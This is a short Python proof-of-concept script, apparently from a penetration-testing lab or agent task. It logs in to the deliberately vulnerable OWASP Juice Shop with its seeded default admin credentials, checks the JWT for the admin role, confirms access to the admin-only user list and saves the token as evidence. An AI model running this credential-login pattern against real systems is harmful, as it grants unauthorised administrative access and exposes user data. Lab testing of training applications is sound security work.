#!/usr/bin/env python3
"""
PoC: Gain an admin session token on OWASP Juice Shop WITHOUT any SQL injection.

Vector: Default / weak seeded admin credentials (admin@juice-sh.op : admin123).
No SQL injection payloads are used anywhere - it is a plain JSON login request.

Success criteria:
  1. POST /rest/user/login returns a JWT whose payload contains role == "admin".
  2. The JWT is accepted by an admin-only endpoint (GET /api/Users -> 200 + user list).

Saves the token to /workspace/evidence/c7_no_sqli_token.txt
"""
import base64
import json
import sys
import urllib.request

BASE = "http://host.docker.internal:3000"
EMAIL = "admin@juice-sh.op"
PASSWORD = "admin123"          # seeded default credential - NOT an injection
OUT = "/workspace/evidence/c7_no_sqli_token.txt"


def b64url_decode(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def post_json(path, obj):
    req = urllib.request.Request(
        BASE + path,
        data=json.dumps(obj).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req) as r:
        return r.status, json.loads(r.read())


def get_json(path, token):
    req = urllib.request.Request(BASE + path, headers={"Authorization": "Bearer " + token})
    with urllib.request.urlopen(req) as r:
        return r.status, json.loads(r.read())


def main():
    status, body = post_json("/rest/user/login", {"email": EMAIL, "password": PASSWORD})
    print(f"[*] POST /rest/user/login -> HTTP {status}")
    token = body["authentication"]["token"]

    header = json.loads(b64url_decode(token.split(".")[0]))
    payload = json.loads(b64url_decode(token.split(".")[1]))
    role = payload.get("data", {}).get("role")
    print(f"[*] JWT header : {header}")
    print(f"[*] JWT role   : {role}")
    if role != "admin":
        print("[-] Token is NOT admin - aborting")
        sys.exit(1)

    # Verify against an admin-only endpoint
    status2, users = get_json("/api/Users", token)
    data = users.get("data", users) if isinstance(users, dict) else users
    roles = {u.get("role") for u in data if isinstance(u, dict)}
    print(f"[*] GET /api/Users -> HTTP {status2}; {len(data)} users; roles seen: {roles}")
    if status2 != 200 or "admin" not in roles:
        print("[-] Admin endpoint verification failed")
        sys.exit(1)

    import os
    os.makedirs(os.path.dirname(OUT), exist_ok=True)
    with open(OUT, "w") as f:
        f.write(token)
    print(f"[+] CONFIRMED admin session. Token saved to {OUT}")
    print(f"[+] Token: {token}")


if __name__ == "__main__":
    main()
